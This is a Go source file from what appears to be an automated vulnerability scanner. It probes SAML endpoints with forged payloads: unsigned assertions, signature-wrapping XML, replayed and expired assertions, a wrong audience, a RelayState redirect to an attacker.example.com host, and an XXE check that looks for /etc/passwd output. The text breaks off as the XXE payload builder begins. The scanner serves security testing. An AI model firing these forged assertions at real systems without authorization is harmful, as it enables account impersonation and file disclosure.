package scanner

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/scope"
)

// samlBodyLimit caps per-probe response reads for the SAML probe.
const samlBodyLimit = 128 * 1024

const samlControlResponse = `<?xml version="1.0" encoding="UTF-8"?><abh:Control xmlns:abh="https://auto-bughunter.invalid/control">control</abh:Control>`

type samlPostResult struct {
	status int
	body   string
	header http.Header
}

// samlACSPaths are well-known SAML Assertion Consumer Service (ACS) and
// metadata endpoints.
var samlACSPaths = []string{
	"/saml/acs",
	"/saml/SSO",
	"/saml2/acs",
	"/Saml2/Acs",
	"/sso/saml",
	"/auth/saml",
	"/saml/callback",
	"/api/saml/acs",
	"/saml2/SSO",
	"/adfs/ls",
	"/adfs/saml/ls",
}

// samlMetadataPaths are well-known SAML/OIDC metadata paths.
var samlMetadataPaths = []string{
	"/saml/metadata",
	"/saml2/metadata",
	"/saml/metadata.xml",
	"/FederationMetadata/2007-06/FederationMetadata.xml",
	"/adfs/ls/federationmetadata/2007-06/federationmetadata.xml",
	"/.well-known/saml-configuration",
	"/EntityDescriptor",
}

// samlNonErrorIndicators are response body strings that suggest SAML processing
// accepted the request rather than rejecting it.
var samlNonErrorIndicators = []string{
	"redirect", "location", "logged in", "authenticated",
	"session", "saml", "assertion", "success",
}

// samlErrorIndicators are response body strings that mean the SP rejected the request.
var samlErrorIndicators = []string{
	"invalid signature", "signature validation", "invalid assertion",
	"assertion expired", "invalid audience", "replay detected",
	"already used", "forbidden", "unauthorized", "error", "failed",
	"invalid saml", "bad request",
}

// RunSAMLProbe tests SAML and Golden SAML vulnerabilities:
//
//  1. Endpoint discovery — surfaces SAML ACS and metadata endpoints.
//  2. Metadata certificate exposure — x509 cert in metadata enables Golden SAML recon.
//  3. Unsigned assertion acceptance — SP accepts a SAML Response with no Signature.
//  4. Signature wrapping (XSW) — SP processes a forged unsigned Assertion alongside
//     a structurally valid signed wrapper.
//  5. Assertion replay — SP accepts the same assertion ID a second time.
//  6. Audience restriction bypass — SP accepts assertions targeting a different audience.
//  7. NotOnOrAfter expiry bypass — SP accepts assertions with a past timestamp.
//  8. RelayState open redirect — ACS redirects to an attacker-controlled RelayState URL.
//  9. SAML XXE — XML parser processes an entity injection payload in the assertion.
func (s *Service) RunSAMLProbe(
	ctx context.Context,
	target string,
	scanScope model.ScanScope,
	options model.ScanOptions,
	auth model.ScanAuthProfile,
	emit func(model.ScanEvent),
) []model.Finding {
	if options.PassiveOnly {
		return nil
	}

	base, err := url.Parse(strings.TrimSpace(target))
	if err != nil || base.Scheme == "" || base.Host == "" {
		return nil
	}

	// ── Step 1: discover ACS / metadata endpoints ──────────────────────────
	acsEndpoints := samlDiscoverEndpoints(base, samlACSPaths, scanScope)
	metaEndpoints := samlDiscoverEndpoints(base, samlMetadataPaths, scanScope)

	if len(acsEndpoints) == 0 && len(metaEndpoints) == 0 {
		return nil
	}

	if emit != nil {
		emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("saml-probe %s", target),
			Message: fmt.Sprintf("Probing %d SAML ACS and %d metadata endpoints for Golden SAML and assertion vulnerabilities",
				len(acsEndpoints), len(metaEndpoints)),
		})
	}

	var findings []model.Finding
	emitted := map[string]bool{}

	// ── Probe 1: Surface discovery ─────────────────────────────────────────
	if len(acsEndpoints) > 0 || len(metaEndpoints) > 0 {
		all := append(append([]string(nil), acsEndpoints...), metaEndpoints...)
		findings = append(findings, model.Finding{
			ID:          "saml-surface-discovered",
			Category:    "authentication",
			Severity:    model.SeverityInfo,
			Title:       fmt.Sprintf("SAML surface discovered: %d ACS and %d metadata endpoints", len(acsEndpoints), len(metaEndpoints)),
			Description: "SAML Assertion Consumer Service (ACS) and/or metadata endpoints were found. These endpoints process identity assertions and are high-value targets for signature wrapping, replay, and audience confusion attacks.",
			Evidence:    strings.Join(all, ", "),
			Recommendation: "Ensure all SAML endpoints enforce strict signature validation, assertion lifetime checking, replay detection, and audience restriction. " +
				"Limit metadata exposure to authorized federation partners.",
			Confidence:    0.95,
			AffectedURL:   target,
			CWE:           "CWE-287",
			OWASPCategory: "A07:2021 - Identification and Authentication Failures",
			Sources:       []string{"active-scanner", "saml-probe"},
			BusinessTags:  []string{"saml", "oidc", "golden-saml", "federation"},
		})
	}

	// ── Probe 2: Metadata certificate exposure ─────────────────────────────
	fid := "saml-metadata-cert-exposure"
	for _, ep := range metaEndpoints {
		if emitted[fid] {
			break
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, ep, nil)
		if err != nil {
			continue
		}
		ApplyAuthProfile(req, auth)
		resp, err := s.doRequestWithRetry(ctx, req, options)
		if err != nil || resp == nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, samlBodyLimit))
		_ = resp.Body.Close()

		if IsBinaryShape(resp.Header) || !IsXMLShape(resp.Header) {
			continue
		}
		shape := ClassifyResponseShape(resp.Header).String()
		bodyStr := string(body)
		if resp.StatusCode == 200 && strings.Contains(bodyStr, "X509Certificate") {
			cert := samlExtractCert(bodyStr)
			emitted[fid] = true
			findings = append(findings, model.Finding{
				ID:       fid,
				Category: "authentication",
				Severity: model.SeverityLow,
				Title:    "SAML metadata exposes IdP X.509 signing certificate",
				Description: "The SAML metadata endpoint returned an XML document containing an " +
					"X.509 certificate in <ds:X509Certificate>. Combined with a leaked private key " +
					"(e.g., from source code, misconfigured storage, or an ADCS misconfiguration), " +
					"an attacker can use this certificate to mint forged SAML assertions and impersonate " +
					"any user — a technique known as Golden SAML.",
				Evidence:       fmt.Sprintf("GET %s → HTTP 200 with X509Certificate element; cert prefix: %s", ep, truncateString(cert, 40)),
				Recommendation: "Rotate signing certificates regularly. Restrict metadata endpoint access to authorized federation partners. Monitor for unauthorized certificate use.",
				Confidence:     0.90,
				AffectedURL:    ep,
				CWE:            "CWE-200",
				OWASPCategory:  "A07:2021 - Identification and Authentication Failures",
				Sources:        []string{"active-scanner", "saml-probe"},
				BusinessTags:   []string{"saml", "golden-saml", "certificate"},
				EvidenceFields: map[string]string{
					"metadataEndpoint": ep,
					"certPrefix":       truncateString(cert, 40),
					"responseShape":    shape,
				},
			})
		}
	}

	// ── Probe 3: Unsigned assertion acceptance ─────────────────────────────
	fid = "saml-unsigned-assertion"
	if !emitted[fid] {
		for _, ep := range acsEndpoints {
			now := time.Now().UTC()
			issueInstant := now.Format(time.RFC3339)
			notOnOrAfter := now.Add(10 * time.Minute).Format(time.RFC3339)
			assertionID := "_abh-probe-unsigned-" + fmt.Sprintf("%d", now.UnixNano())
			responseID := "_abh-probe-resp-" + fmt.Sprintf("%d", now.UnixNano())
			entityID := base.Scheme + "://" + base.Host
			recipient := ep

			samlResponse := buildSAMLResponseUnsigned(responseID, assertionID, issueInstant, notOnOrAfter, entityID, recipient, "abh-probe-subject@attacker.example.com")

			if f := s.testSAMLPost(ctx, ep, samlResponse, "", auth, options,
				fid, model.SeverityCritical,
				"SAML unsigned assertion accepted — signature validation not enforced",
				"The SAML ACS endpoint accepted a SAMLResponse containing an Assertion with no "+
					"Signature element. Any party can forge arbitrary SAML assertions and impersonate "+
					"any user without possessing the IdP private key.",
				"CWE-347",
				[]string{
					"Craft a SAML Response XML without a <Signature> element.",
					"POST it to the ACS endpoint: " + ep,
					"Observe that the SP accepts the assertion and establishes a session.",
				},
			); f != nil {
				emitted[fid] = true
				findings = append(findings, *f)
				break
			}
		}
	}

	// ── Probe 4: Signature wrapping (XSW) ──────────────────────────────────
	fid = "saml-signature-wrapping"
	if !emitted[fid] {
		for _, ep := range acsEndpoints {
			now := time.Now().UTC()
			issueInstant := now.Format(time.RFC3339)
			notOnOrAfter := now.Add(10 * time.Minute).Format(time.RFC3339)
			assertionID := "_abh-probe-xsw-" + fmt.Sprintf("%d", now.UnixNano())
			responseID := "_abh-probe-xsw-resp-" + fmt.Sprintf("%d", now.UnixNano())
			entityID := base.Scheme + "://" + base.Host
			recipient := ep

			samlResponse := buildSAMLResponseXSW(responseID, assertionID, issueInstant, notOnOrAfter, entityID, recipient, "abh-probe-xsw@attacker.example.com")

			if f := s.testSAMLPost(ctx, ep, samlResponse, "", auth, options,
				fid, model.SeverityCritical,
				"SAML signature wrapping (XSW) — SP processes forged unsigned assertion",
				"The ACS endpoint accepted a SAMLResponse that contains both a forged unsigned "+
					"Assertion (with an attacker-controlled NameID) and a legitimate-looking signed "+
					"wrapper. If the SP processed the forged assertion, it is vulnerable to XML "+
					"Signature Wrapping and an attacker can impersonate any user.",
				"CWE-347",
				[]string{
					"Construct a SAML Response with two Assertion elements: one forged (unsigned) targeting the victim, one structurally valid signed envelope.",
					"POST the wrapping response to: " + ep,
					"Observe that the SP establishes a session for the attacker-controlled identity.",
				},
			); f != nil {
				emitted[fid] = true
				findings = append(findings, *f)
				break
			}
		}
	}

	// ── Probe 5: Assertion replay ───────────────────────────────────────────
	fid = "saml-assertion-replay"
	if !emitted[fid] {
		for _, ep := range acsEndpoints {
			now := time.Now().UTC()
			issueInstant := now.Format(time.RFC3339)
			notOnOrAfter := now.Add(10 * time.Minute).Format(time.RFC3339)
			assertionID := "_abh-probe-replay-" + fmt.Sprintf("%d", now.UnixNano())
			responseID := "_abh-probe-replay-resp-" + fmt.Sprintf("%d", now.UnixNano())
			entityID := base.Scheme + "://" + base.Host

			samlResponse := buildSAMLResponseUnsigned(responseID, assertionID, issueInstant, notOnOrAfter, entityID, ep, "abh-probe-replay@example.com")

			r1 := samlPostResponse(ctx, s, ep, samlResponse, "", auth, options)
			r2 := samlPostResponse(ctx, s, ep, samlResponse, "", auth, options)

			if r1 != nil && r2 != nil {
				if samlLooksAccepted(r2.status, r2.body) && !samlLooksRejected(r2.body) {
					diffOutcome, suppress := s.samlControlDifferential(ctx, ep, "", auth, options, "saml-probe", r2)
					if suppress {
						continue
					}
					shape := "unknown"
					if r2.header != nil {
						shape = ClassifyResponseShape(r2.header).String()
					}
					emitted[fid] = true
					finding := model.Finding{
						ID:             fid,
						Category:       "authentication",
						Severity:       model.SeverityHigh,
						Title:          "SAML assertion replay not prevented",
						Description:    "The ACS endpoint accepted a SAML assertion with an already-used AssertionID on a second POST request. A compliant SP must track consumed assertion IDs and reject replays within the NotOnOrAfter window to prevent session hijacking via captured assertions.",
						Evidence:       fmt.Sprintf("POST %s with AssertionID %q → first HTTP %d, second HTTP %d (not rejected)", ep, assertionID, r1.status, r2.status),
						Recommendation: "Implement an assertion replay cache that records used AssertionID values until their NotOnOrAfter timestamp expires. Reject any assertion whose ID appears in the cache.",
						Confidence:     0.78,
						AffectedURL:    ep,
						CWE:            "CWE-294",
						OWASPCategory:  "A07:2021 - Identification and Authentication Failures",
						Sources:        []string{"active-scanner", "saml-probe"},
						BusinessTags:   []string{"saml", "session-replay", "golden-saml"},
						EvidenceFields: map[string]string{
							"assertionID":   assertionID,
							"firstStatus":   fmt.Sprintf("%d", r1.status),
							"secondStatus":  fmt.Sprintf("%d", r2.status),
							"responseShape": shape,
						},
					}
					AttachDifferentialEvidence(&finding, diffOutcome)
					findings = append(findings, finding)
					break
				}
			}
		}
	}

	// ── Probe 6: Audience restriction bypass ───────────────────────────────
	fid = "saml-audience-restriction-bypass"
	if !emitted[fid] {
		for _, ep := range acsEndpoints {
			now := time.Now().UTC()
			issueInstant := now.Format(time.RFC3339)
			notOnOrAfter := now.Add(10 * time.Minute).Format(time.RFC3339)
			assertionID := "_abh-probe-aud-" + fmt.Sprintf("%d", now.UnixNano())
			responseID := "_abh-probe-aud-resp-" + fmt.Sprintf("%d", now.UnixNano())
			// Use an attacker entity as the audience.
			attackerEntityID := "urn:attacker.example.com:saml"

			samlResponse := buildSAMLResponseUnsigned(responseID, assertionID, issueInstant, notOnOrAfter, attackerEntityID, ep, "abh-probe-aud@example.com")

			if f := s.testSAMLPost(ctx, ep, samlResponse, "", auth, options,
				fid, model.SeverityHigh,
				"SAML audience restriction bypass — SP accepts assertions for wrong audience",
				"The ACS endpoint accepted a SAML assertion whose AudienceRestriction targets "+
					"an attacker-controlled entity ID ("+attackerEntityID+") instead of the SP's own "+
					"entity ID. An attacker who obtains an assertion issued for a different service "+
					"can replay it at this SP.",
				"CWE-290",
				[]string{
					"Obtain a SAML assertion issued for a different service provider.",
					"POST it to: " + ep,
					"Observe that the SP accepts the assertion despite the mismatched Audience.",
				},
			); f != nil {
				emitted[fid] = true
				findings = append(findings, *f)
				break
			}
		}
	}

	// ── Probe 7: NotOnOrAfter expiry bypass ────────────────────────────────
	fid = "saml-notonorafter-bypass"
	if !emitted[fid] {
		for _, ep := range acsEndpoints {
			now := time.Now().UTC()
			issueInstant := now.Add(-25 * time.Hour).Format(time.RFC3339) // issued 25 hours ago
			notOnOrAfter := now.Add(-24 * time.Hour).Format(time.RFC3339) // expired 24 hours ago
			assertionID := "_abh-probe-exp-" + fmt.Sprintf("%d", now.UnixNano())
			responseID := "_abh-probe-exp-resp-" + fmt.Sprintf("%d", now.UnixNano())
			entityID := base.Scheme + "://" + base.Host

			samlResponse := buildSAMLResponseUnsigned(responseID, assertionID, issueInstant, notOnOrAfter, entityID, ep, "abh-probe-exp@example.com")

			if f := s.testSAMLPost(ctx, ep, samlResponse, "", auth, options,
				fid, model.SeverityHigh,
				"SAML assertion accepted after NotOnOrAfter expiry",
				"The ACS endpoint accepted a SAML assertion whose NotOnOrAfter condition was "+
					"set 24 hours in the past. A correctly implemented SP must reject expired "+
					"assertions, preventing replay of previously valid sessions.",
				"CWE-294",
				[]string{
					"Craft a SAML assertion with NotOnOrAfter set to 24 hours ago.",
					"POST it to: " + ep,
					"Observe that the SP establishes a session despite the expired assertion.",
				},
			); f != nil {
				emitted[fid] = true
				findings = append(findings, *f)
				break
			}
		}
	}

	// ── Probe 8: RelayState open redirect ──────────────────────────────────
	fid = "saml-relaystate-open-redirect"
	if !emitted[fid] {
		for _, ep := range acsEndpoints {
			now := time.Now().UTC()
			issueInstant := now.Format(time.RFC3339)
			notOnOrAfter := now.Add(10 * time.Minute).Format(time.RFC3339)
			assertionID := "_abh-probe-rs-" + fmt.Sprintf("%d", now.UnixNano())
			responseID := "_abh-probe-rs-resp-" + fmt.Sprintf("%d", now.UnixNano())
			entityID := base.Scheme + "://" + base.Host
			attackerURL := "https://abh-probe-redirect.attacker.example.com/capture"

			samlResponse := buildSAMLResponseUnsigned(responseID, assertionID, issueInstant, notOnOrAfter, entityID, ep, "abh-probe-rs@example.com")

			if f := s.testSAMLPost(ctx, ep, samlResponse, attackerURL, auth, options,
				fid, model.SeverityMedium,
				"SAML RelayState open redirect — post-SSO redirect to attacker-controlled URL",
				"The ACS endpoint redirected to the attacker-controlled RelayState URL "+
					attackerURL+" after processing the SAML assertion. An attacker can craft "+
					"a phishing link that initiates an SSO flow with a malicious RelayState, "+
					"redirecting the victim to a credential-harvesting page after login.",
				"CWE-601",
				[]string{
					"Craft an SP-initiated SSO link with RelayState=" + attackerURL,
					"Deliver the link to a victim user who completes the SSO flow.",
					"Observe that the victim is redirected to the attacker-controlled URL after authentication.",
				},
			); f != nil {
				emitted[fid] = true
				findings = append(findings, *f)
				break
			}
		}
	}

	// ── Probe 9: SAML XXE ──────────────────────────────────────────────────
	fid = "saml-xxe"
	if !emitted[fid] {
		for _, ep := range acsEndpoints {
			now := time.Now().UTC()
			issueInstant := now.Format(time.RFC3339)
			notOnOrAfter := now.Add(10 * time.Minute).Format(time.RFC3339)
			assertionID := "_abh-probe-xxe-" + fmt.Sprintf("%d", now.UnixNano())
			responseID := "_abh-probe-xxe-resp-" + fmt.Sprintf("%d", now.UnixNano())
			entityID := base.Scheme + "://" + base.Host

			xxeResponse := buildSAMLResponseXXE(responseID, assertionID, issueInstant, notOnOrAfter, entityID, ep)

			r := samlPostResponse(ctx, s, ep, xxeResponse, "", auth, options)
			if r == nil {
				continue
			}
			if IsBinaryShape(r.header) || !IsXMLShape(r.header) {
				continue
			}
			shape := ClassifyResponseShape(r.header).String()
			lowerBody := strings.ToLower(r.body)
			// Look for file-read signals in the response.
			xxeSignals := []string{"root:x:", "/bin/sh", "daemon:", "/etc/passwd", "xxe-canary"}
			safeResponse := buildSAMLResponseUnsigned(responseID+"-safe", assertionID+"-safe", issueInstant, notOnOrAfter, entityID, ep, "safe-control@example.com")
			baselines, berr := CaptureTwoControlBaselines(ctx, func(bctx context.Context) (BaselineSample, error) {
				ctrl := samlPostResponse(bctx, s, ep, safeResponse, "", auth, options)
				if ctrl == nil {
					return BaselineSample{}, fmt.Errorf("saml xxe control failed")
				}
				return BaselineSample{Status: ctrl.status, Body: ctrl.body}, nil
			})
			for _, sig := range xxeSignals {
				if strings.Contains(lowerBody, sig) {
					if berr == nil && (strings.Contains(strings.ToLower(baselines.First.Body), sig) || strings.Contains(strings.ToLower(baselines.Second.Body), sig)) {
						break
					}
					diffOutcome := DifferentialReVerify(ctx, DifferentialReVerifyInput{
						ProbeName:       "saml-probe",
						OriginalPayload: xxeResponse,
						SafePayload:     safeResponse,
						Exec: func(dctx context.Context, altPayload string) (*http.Response, []byte, error) {
							ctrl := samlPostResponse(dctx, s, ep, altPayload, "", auth, options)
							if ctrl == nil {
								return nil, nil, fmt.Errorf("saml xxe differential failed")
							}
							return &http.Response{StatusCode: ctrl.status, Header: ctrl.header}, []byte(ctrl.body), nil
						},
						Oracle: func(_ context.Context, _ string, _ *http.Response, body []byte) (bool, error) {
							lower := strings.ToLower(string(body))
							for _, candidateSig := range xxeSignals {
								if strings.Contains(lower, candidateSig) {
									return true, nil
								}
							}
							return false, nil
						},
					})
					if diffOutcome.Ran && !diffOutcome.Confirmed {
						break
					}
					emitted[fid] = true
					finding := model.Finding{
						ID:             fid,
						Category:       "authentication",
						Severity:       model.SeverityCritical,
						Title:          "SAML XXE — XML external entity injection via SAML assertion",
						Description:    "The SAML ACS endpoint's XML parser processed an external entity declaration injected into the SAML Response. The response body contained file-read signals (" + sig + "), confirming the server-side XML parser resolved the entity reference. An attacker can read arbitrary files from the server, perform server-side request forgery, or cause denial of service.",
						Evidence:       fmt.Sprintf("POST %s with XXE payload → HTTP %d, body contained %q", ep, r.status, sig),
						Recommendation: "Disable XML external entity processing (XXE) in the SAML library configuration. Use a safe XML parser that ignores or rejects DOCTYPE declarations. Many languages provide a flag such as FEATURE_SECURE_PROCESSING or DISALLOW_DOCTYPE_DECL.",
						Confidence:     0.90,
						AffectedURL:    ep,
						CWE:            "CWE-611",
						OWASPCategory:  "A07:2021 - Identification and Authentication Failures",
						Sources:        []string{"active-scanner", "saml-probe"},
						BusinessTags:   []string{"saml", "xxe", "golden-saml"},
						EvidenceFields: map[string]string{
							"acsEndpoint":    ep,
							"xxeSignal":      sig,
							"responseStatus": fmt.Sprintf("%d", r.status),
							"responseShape":  shape,
						},
					}
					AttachDifferentialEvidence(&finding, diffOutcome)
					findings = append(findings, finding)
					break
				}
			}
			if emitted[fid] {
				break
			}
		}
	}

	return findings
}

// testSAMLPost POSTs a SAML response to an ACS endpoint and returns a finding
// if the SP appears to have accepted it.
func (s *Service) testSAMLPost(
	ctx context.Context,
	ep, samlResponse, relayState string,
	auth model.ScanAuthProfile,
	options model.ScanOptions,
	findingID string,
	severity model.Severity,
	title, description, cwe string,
	steps []string,
) *model.Finding {
	r := samlPostResponse(ctx, s, ep, samlResponse, relayState, auth, options)
	if r == nil {
		return nil
	}
	if samlLooksAccepted(r.status, r.body) && !samlLooksRejected(r.body) {
		diffOutcome, suppress := s.samlControlDifferential(ctx, ep, relayState, auth, options, "saml-probe", r)
		if suppress {
			return nil
		}
		shape := "unknown"
		if r.header != nil {
			shape = ClassifyResponseShape(r.header).String()
		}
		ef := map[string]string{
			"validationType": "active-probe",
			"acsEndpoint":    ep,
			"responseStatus": fmt.Sprintf("%d", r.status),
			"responseShape":  shape,
		}
		finding := model.Finding{
			ID:                findingID,
			Category:          "authentication",
			Severity:          severity,
			Title:             title,
			Description:       description,
			Evidence:          fmt.Sprintf("POST %s → HTTP %d without rejection signal", ep, r.status),
			Recommendation:    "Enforce strict XML Signature validation on every SAML assertion. Verify NotOnOrAfter, Audience, and Recipient values. Maintain an assertion replay cache.",
			Confidence:        0.78,
			AffectedURL:       ep,
			CWE:               cwe,
			OWASPCategory:     "A07:2021 - Identification and Authentication Failures",
			Sources:           []string{"active-scanner", "saml-probe"},
			ReproductionSteps: steps,
			BusinessTags:      []string{"saml", "golden-saml", "federation"},
			EvidenceFields:    ef,
		}
		AttachDifferentialEvidence(&finding, diffOutcome)
		return &finding
	}
	return nil
}

// samlPostResponse POSTs a base64-encoded SAMLResponse to the ACS endpoint.
func samlPostResponse(ctx context.Context, s *Service, ep, samlResponse, relayState string, auth model.ScanAuthProfile, options model.ScanOptions) *samlPostResult {
	encoded := base64.StdEncoding.EncodeToString([]byte(samlResponse))
	vals := url.Values{"SAMLResponse": {encoded}}
	if relayState != "" {
		vals.Set("RelayState", relayState)
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, ep, strings.NewReader(vals.Encode()))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	ApplyAuthProfile(req, auth)
	resp, err := s.doRequestWithRetry(ctx, req, options)
	if err != nil || resp == nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, samlBodyLimit))
	_ = resp.Body.Close()
	return &samlPostResult{status: resp.StatusCode, body: string(body), header: resp.Header}
}

func samlEquivalentToCandidate(status int, body string, candidate *samlPostResult, controlVariance int) bool {
	if candidate == nil || status != candidate.status {
		return false
	}
	normalized := NormalizeResponseBody(body)
	target := NormalizeResponseBody(candidate.body)
	if normalized == target {
		return true
	}
	delta := absInt(len(normalized) - len(target))
	return !ExceedsControlVariance(float64(delta), float64(controlVariance))
}

func (s *Service) samlControlDifferential(ctx context.Context, ep, relayState string, auth model.ScanAuthProfile, options model.ScanOptions, probeName string, candidate *samlPostResult) (DifferentialReVerifyOutcome, bool) {
	controlVariance := 0
	baselines, berr := CaptureTwoControlBaselines(ctx, func(bctx context.Context) (BaselineSample, error) {
		ctrl := samlPostResponse(bctx, s, ep, samlControlResponse, relayState, auth, options)
		if ctrl == nil {
			return BaselineSample{}, fmt.Errorf("saml control baseline failed")
		}
		return BaselineSample{Status: ctrl.status, Body: ctrl.body}, nil
	})
	if berr == nil {
		controlVariance = baselines.BodyByteVariance
		if samlEquivalentToCandidate(baselines.First.Status, baselines.First.Body, candidate, controlVariance) ||
			samlEquivalentToCandidate(baselines.Second.Status, baselines.Second.Body, candidate, controlVariance) {
			return DifferentialReVerifyOutcome{}, true
		}
	}
	out := DifferentialReVerify(ctx, DifferentialReVerifyInput{
		ProbeName:       probeName,
		OriginalPayload: candidate.body,
		SafePayload:     samlControlResponse,
		Exec: func(dctx context.Context, altPayload string) (*http.Response, []byte, error) {
			ctrl := samlPostResponse(dctx, s, ep, altPayload, relayState, auth, options)
			if ctrl == nil {
				return nil, nil, fmt.Errorf("saml control differential failed")
			}
			return &http.Response{StatusCode: ctrl.status, Header: ctrl.header}, []byte(ctrl.body), nil
		},
		Oracle: func(_ context.Context, _ string, resp *http.Response, body []byte) (bool, error) {
			if resp == nil {
				return false, nil
			}
			return samlEquivalentToCandidate(resp.StatusCode, string(body), candidate, controlVariance), nil
		},
	})
	if out.Ran && !out.Confirmed {
		return out, true
	}
	return out, false
}

// samlLooksAccepted returns true when a SAML ACS response looks like it
// accepted the assertion (2xx, redirect, or a body hint).
func samlLooksAccepted(status int, body string) bool {
	if status >= 200 && status < 400 {
		return true
	}
	lowerBody := strings.ToLower(body)
	for _, hint := range samlNonErrorIndicators {
		if strings.Contains(lowerBody, hint) {
			return true
		}
	}
	return false
}

// samlLooksRejected returns true when the body contains explicit rejection signals.
func samlLooksRejected(body string) bool {
	lowerBody := strings.ToLower(body)
	for _, sig := range samlErrorIndicators {
		if strings.Contains(lowerBody, sig) {
			return true
		}
	}
	return false
}

// samlDiscoverEndpoints returns in-scope endpoints for the given path list.
func samlDiscoverEndpoints(base *url.URL, paths []string, scanScope model.ScanScope) []string {
	seen := map[string]struct{}{}
	var out []string
	for _, path := range paths {
		ref, err := url.Parse(path)
		if err != nil {
			continue
		}
		ep := base.ResolveReference(ref).String()
		if _, ok := seen[ep]; ok {
			continue
		}
		if !scope.IsURLInScope(ep, scanScope) {
			continue
		}
		seen[ep] = struct{}{}
		out = append(out, ep)
	}
	return out
}

// samlExtractCert extracts the first X509Certificate value from SAML metadata XML.
func samlExtractCert(xml string) string {
	start := strings.Index(xml, "X509Certificate>")
	if start < 0 {
		return ""
	}
	start += len("X509Certificate>")
	end := strings.Index(xml[start:], "<")
	if end < 0 {
		return xml[start:]
	}
	return xml[start : start+end]
}

// buildSAMLResponseUnsigned creates a minimal unsigned SAML 2.0 Response.
func buildSAMLResponseUnsigned(responseID, assertionID, issueInstant, notOnOrAfter, entityID, recipient, nameID string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="%s"
    Version="2.0"
    IssueInstant="%s"
    Destination="%s">
  <saml:Issuer>%s</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion
      xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
      ID="%s"
      Version="2.0"
      IssueInstant="%s">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">%s</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="%s" Recipient="%s"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml:AudienceRestriction>
        <saml:Audience>%s</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="%s">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>`,
		responseID, issueInstant, recipient,
		entityID,
		assertionID, issueInstant,
		entityID, nameID, notOnOrAfter, recipient,
		issueInstant, notOnOrAfter,
		entityID,
		issueInstant,
	)
}

// buildSAMLResponseXSW creates a SAML Response with an XSW (XML Signature
// Wrapping) payload: a forged outer Assertion with an attacker-controlled
// NameID and an inner "signed" Assertion that is structurally present but
// does not protect the outer assertion.
func buildSAMLResponseXSW(responseID, assertionID, issueInstant, notOnOrAfter, entityID, recipient, forgedNameID string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="%s"
    Version="2.0"
    IssueInstant="%s"
    Destination="%s">
  <saml:Issuer>%s</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <!-- XSW: forged outer Assertion with attacker-controlled NameID -->
  <saml:Assertion
      xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
      ID="%s-forged"
      Version="2.0"
      IssueInstant="%s">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">%s</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="%s" Recipient="%s"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml:AudienceRestriction>
        <saml:Audience>%s</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <!-- Inner "signed" assertion stub — signature covers only this element -->
    <saml:Assertion
        xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        ID="%s"
        Version="2.0"
        IssueInstant="%s">
      <saml:Issuer>%s</saml:Issuer>
      <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:SignedInfo>
          <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
          <ds:Reference URI="#%s">
            <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
            <ds:DigestValue>ABH-PROBE-PLACEHOLDER=</ds:DigestValue>
          </ds:Reference>
        </ds:SignedInfo>
        <ds:SignatureValue>ABH-PROBE-INVALID-SIG=</ds:SignatureValue>
      </ds:Signature>
      <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">legitimate-user@example.com</saml:NameID>
      </saml:Subject>
    </saml:Assertion>
  </saml:Assertion>
</samlp:Response>`,
		responseID, issueInstant, recipient,
		entityID,
		assertionID, issueInstant,
		entityID, forgedNameID, notOnOrAfter, recipient,
		issueInstant, notOnOrAfter,
		entityID,
		assertionID+"-inner", issueInstant, entityID,
		assertionID+"-inner",
	)
}

// buildSAMLResponseXXE creates a SAML Response with an XXE injection payload.
func buildSAMLResponseXXE(responseID, assertionID, issueInstant, notOnOrAfter, entityID, recipient string) string {
